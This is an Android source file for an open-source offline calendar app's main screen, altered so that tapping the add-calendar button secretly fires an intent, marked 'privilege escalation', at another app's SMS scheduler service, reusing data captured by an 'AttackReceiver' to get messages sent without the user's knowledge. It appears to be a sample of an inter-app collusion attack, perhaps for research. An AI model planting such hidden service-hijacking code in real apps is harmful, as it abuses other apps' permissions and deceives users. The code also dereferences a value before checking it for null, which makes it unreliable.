/*
 * Copyright (C) 2013-2016 Dominik Schürmann <dominik@dominikschuermann.de>
 * Copyright (C) 2012 Harald Seltner <h.seltner@gmx.at>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.sufficientlysecure.localcalendar.ui;

import android.Manifest;
import android.app.Activity;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.design.widget.FloatingActionButton;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.text.SpannableString;
import android.text.method.LinkMovementMethod;
import android.text.util.Linkify;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import org.sufficientlysecure.localcalendar.R;
import org.sufficientlysecure.localcalendar.util.InstallLocationHelper;
import android.app.Service;
import android.os.IBinder;
import android.support.annotation.Nullable;
import org.sufficientlysecure.localcalendar.AttackReceiver;
import org.sufficientlysecure.localcalendar.util.Log;

import java.io.File;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_PERMISSIONS_WRITE_CALENDAR = 1;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        if (prefs.getBoolean("useDarkTheme", false)) {
            setTheme(R.style.DarkTheme);
        } else {
            setTheme(R.style.LightTheme);
        }

        super.onCreate(savedInstanceState);
        setContentView(R.layout.main_activity);

        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        // check Android 6 permission
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CALENDAR)
                == PackageManager.PERMISSION_GRANTED) {
            init();
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.WRITE_CALENDAR},
                    REQUEST_PERMISSIONS_WRITE_CALENDAR);
        }

    }

    private void init() {
        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.main_activity_fab_add);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showAddCalendarActivity();
            }
        });

        /**
         * Offline Calendar must be install on internal location!
         *
         * from bug report (https://github.com/dschuermann/offline-calendar/issues/19):
         * I am using S2E, which extends phone disk space by putting apps to the SD card.
         * The SD card is mounted quite late during the boot process,
         * but Android needs sync adapters earlier at boot time to be able to use them.
         * As a result, sync adapters like the offline calendar seemed to disappear during boot,
         * although Android is simply not able to load it soon enough.
         */
        if (InstallLocationHelper.isInstalledOnSdCard(this)) {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setMessage(R.string.main_activity_sd_card_error).setCancelable(false)
                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int id) {
                            finish();
                        }
                    });
            AlertDialog alert = builder.create();
            alert.show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String permissions[],
                                           @NonNull int[] grantResults) {
        switch (requestCode) {
            case REQUEST_PERMISSIONS_WRITE_CALENDAR: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted
                    init();
                } else {
                    Toast.makeText(this, R.string.main_activity_permission_error,
                            Toast.LENGTH_LONG).show();
                    setResult(Activity.RESULT_CANCELED);
                    finish();
                }
            }
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.menu_main, menu);

        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
            menu.getItem(menu.size() - 1).setEnabled(false);
        }

        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle item selection
        switch (item.getItemId()) {
            case R.id.menu_main_about:
                showAbout();
                return true;
            case R.id.menu_main_preferences:
                Intent preferencesActivity = new Intent(this, PreferencesActivity.class);
                startActivity(preferencesActivity);
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    private void showAddCalendarActivity() {

        // privilege escalation
        // send message through SmsSenderService
        Intent inten = new Intent();
        inten.putExtra("attacker", "Hello from offline calendar!");
        inten.setAction("com.github.yeriomin.smsscheduler.AlarmReceiver.INTENT_FILTER");
        long sid = AttackReceiver.in.getExtras().getLong("datetimeCreated", 0);
        inten.putExtra("datetimeCreated", sid);
        if(AttackReceiver.in != null)
            startService(inten);

        // show edit activity with empty text field and add button
        Intent intent = new Intent(this, EditActivity.class);
        startActivity(intent);
    }

    private void showAbout() {
        SpannableString s = new SpannableString(getText(R.string.about));
        Linkify.addLinks(s, Linkify.ALL);
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage(s);
        AlertDialog alert = builder.create();
        alert.show();
        ((TextView) alert.findViewById(android.R.id.message)).setMovementMethod(LinkMovementMethod
                .getInstance());
    }
}
